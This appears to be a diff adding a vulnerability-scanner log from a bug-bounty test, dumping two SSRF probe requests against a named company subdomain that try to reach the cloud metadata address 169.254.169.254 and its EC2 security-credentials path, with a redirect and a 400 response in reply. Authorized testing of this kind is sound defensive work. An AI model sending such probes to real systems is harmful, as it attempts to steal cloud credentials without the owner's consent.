@@ -1,0 +1,46 @@
+[amazon-ec2-ssrf] Dumped HTTP request for https://techsolutions.bitpanda.com
+
+
+GET https://techsolutions.bitpanda.com/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
+Host: techsolutions.bitpanda.com
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+
+
+[amazon-ec2-ssrf] Dumped HTTP response https://techsolutions.bitpanda.com
+
+HTTP/1.1 301 Moved Permanently
+Connection: keep-alive
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+Location: ./ec2-instance/
+Via: 1.1 5d22d4cd27d82c133b77117809cd93b4.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: EZAr2F2NWQzQLV3oalQI2plZ84JGyRu6LwxNdYeBhnDmbx0TWhbdxw==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+Content-Length: 0
+
+
+[amazon-ec2-ssrf] Dumped HTTP request for https://techsolutions.bitpanda.com
+
+
+@tls-sni: techsolutions.bitpanda.com
+GET http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance HTTP/1.1
+Host: techsolutions.bitpanda.com
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+
+
+[amazon-ec2-ssrf] Dumped HTTP response https://techsolutions.bitpanda.com
+
+HTTP/1.1 400 Bad Request
+Content-Length: 163
+Connection: close
+Content-Type: text/html
+Date: Tue, 05 Aug 2025 12:53:24 GMT
+
+<html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></center>
+<hr><center>openresty/1.27.1.2</center>
+</body>
+</html>
+
